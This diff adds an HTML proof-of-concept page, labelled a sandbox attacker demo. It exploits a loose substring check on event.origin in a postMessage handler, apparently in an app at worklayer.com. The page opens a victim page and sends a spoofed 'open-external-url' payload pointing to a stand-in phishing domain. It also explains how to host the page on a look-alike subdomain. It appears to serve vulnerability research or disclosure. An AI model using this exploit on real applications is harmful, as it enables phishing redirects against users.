@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Attacker demo (sandbox)</title>
+<style>
+  body { font-family: monospace; padding: 20px; background: #111; color: #eee; }
+  button { padding: 10px 16px; font-size: 14px; cursor: pointer; }
+  #status { margin-top: 15px; }
+</style>
+</head>
+<body>
+<h2>ATTACKER PAGE (sandbox)</h2>
+<p>
+  This page opens <code>victim.html</code> in a popup and sends it a
+  <code>postMessage</code>. In a real attack this page would be hosted at a
+  spoofed origin such as <code>https://worklayer.com.attacker.io</code> —
+  <strong>this page must be hosted on your spoofed subdomain</strong>
+  (e.g. <code>https://worklayer.com.carancy.com</code>) while victim.html
+  runs on a separate origin (e.g. <code>http://localhost:8000</code> via
+  Termux). That way <code>event.origin</code> on the victim side is genuinely
+  <code>https://worklayer.com.carancy.com</code>, which contains the substring
+  "worklayer.com" and passes the vulnerable check — proving the bypass. Enter
+  the victim's full URL in the field below before running.
+</p>
+
+<p>
+  <label>Victim URL (the origin the message is sent TO — e.g. your phone's
+  <code>http://localhost:8000/victim.html</code> or wherever victim.html is
+  hosted):</label><br>
+  <input type="text" id="victimUrl" size="50"
+         value="http://localhost:8000/victim.html">
+</p>
+
+<button onclick="runDemo()">Open victim.html + send spoofed message</button>
+<div id="status"></div>
+
+<script>
+  function runDemo() {
+    const status = document.getElementById('status');
+    const victimUrl = document.getElementById('victimUrl').value;
+    const popup = window.open(victimUrl, 'victim', 'width=600,height=500');
+
+    status.textContent = 'Opened victim.html, sending message in 1s...';
+
+    setTimeout(() => {
+      // Payload matching the shape the real handler expects
+      const payload = {
+        action: 'open-external-url',
+        url: 'https://attacker-controlled-domain.example/phishing',
+        event: 'authenticated'
+      };
+
+      // Because postMessage's target origin ("*" here) doesn't restrict who
+      // RECEIVES it, and the vulnerable side only checks the string content
+      // of event.origin loosely, the real-world attack works by hosting
+      // THIS page at a domain like worklayer.com.attacker.io so that
+      // event.origin on the victim side is that full spoofed-looking string.
+      popup.postMessage(payload, '*');
+      status.textContent = 'Message sent. Check victim.html log/console.';
+    }, 1000);
+  }
+</script>
+</body>
+</html>
